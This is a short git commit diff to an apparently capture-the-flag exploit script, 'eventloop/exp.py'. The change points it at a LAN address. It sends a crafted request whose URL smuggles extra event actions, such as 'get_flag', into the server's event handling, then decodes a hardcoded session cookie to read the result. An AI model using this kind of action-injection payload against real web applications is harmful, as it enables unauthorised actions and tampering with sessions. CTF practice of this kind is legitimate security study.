21be13b20e4eaed1a3195591202de5e184812418
chaosisaladdar <3589608622@qq.com>
2022-09-04 23:19:14 +0800

    try third

--- eventloop/exp.py
+++ eventloop/exp.py
@@ -33,7 +33,8 @@ def decryption(payload):
 
 
 def get():
-    URL = 'http://localhost:8085'
+    # URL = 'http://localhost:8085'
+    URL = 'http://192.168.48.130:8085'
     res = requests.get(
         URL+"/d5afe1f66147e857/?action:trigger_event%23;action:buy;7%23action:get_flag;")
     if res.status_code == 200:
@@ -43,6 +44,9 @@ def get():
 
 if __name__ == '__main__':
     headers = get()
-    session = headers['Set-Cookie'].split('=')[1].split(';')[0]
+    # session = headers['Set-Cookie'].split('=')[1].split(';')[0]
+    # print(session)
+    session = ".eJyNjt9rgzAcxP-Vkec-xGROFHzpQKFMpdI1yXeM4Y-uNZpUUNua4v8-KWwwuoe9Hdzd5-6KmuMeeW9X9JAjDwkW44y5Q6LTMWOlBr76BA5NrtcyIYEsw-aUy7Yqee3EY3wQNG1z8vgEZIs5gU6wwkHT4g6nVtZu09HZunPKpgxclYeBTs6-j6b3nzbo7SBMK3Nim5JZDafLU8ZsnJjC_4OkoQVeOHOiBr6_kX6DTBa69PslqMsBaGcJIs4RExQqqwa1vrxsUgXytU_CWEXPeIwkKCFrLExtR2bp_m8Y6UF9VP1OdcjDC9QeK93Pkk5f0Cd2XQ.YxR0wA.6lQhZmcvvNOdlGnwRF2qpVRmjSQ"
     de = decryption(session)
-    print([i for i in de['log'] if b'show_flag' in i][0][15:])
+    print(de)
+    # print([i for i in de['log'] if b'show_flag' in i][0][15:])
